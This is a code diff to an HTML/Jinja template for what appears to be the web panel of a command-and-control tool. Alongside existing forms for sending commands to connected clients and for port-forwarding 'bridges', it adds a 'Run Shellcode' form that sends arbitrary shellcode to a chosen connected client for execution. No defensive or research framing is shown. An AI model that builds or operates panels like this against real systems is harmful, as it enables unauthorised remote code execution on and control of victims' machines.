@@ -148,7 +148,7 @@
                 <br />
                 <input type="submit" value="Send Command">
             </form>
-
+            <h2>Port Forward</h2>
             <form method="POST" action="/start_bridge">
                 <label for="local_port">Local Port:</label>
                 <input type="text" name="local_port" required>
@@ -165,6 +165,25 @@
                 <input type="submit" value="Start Bridge">
                 <br />
             </form>        
+            </div>
+            <div>
+                <hr> 
+                <h2>Run Shellcode</h2>
+                <form method="POST" action="{{ url_for('run_shellcode') }}">
+                    <label for="client_id">Client ID:</label>
+                    <select id="client_id" name="client_id" required>
+                        {% if connected_clients %}
+                            {% for client_id in connected_clients %}
+                                <option value="{{ client_id }}">{{ client_id }}</option>
+                            {% endfor %}
+                        {% else %}
+                            <option value="" disabled>No clients available</option>
+                        {% endif %}
+                    </select><br><br>
+                    <label for="shellcode">Shellcode:</label>
+                    <textarea id="shellcode" name="shellcode" rows="10" cols="50" required></textarea><br><br>
+                    <input type="submit" value="Run Shellcode">
+                </form>    
             </div>
             <h2>Results</h2>
             {% for client_id, result in results.items() %}
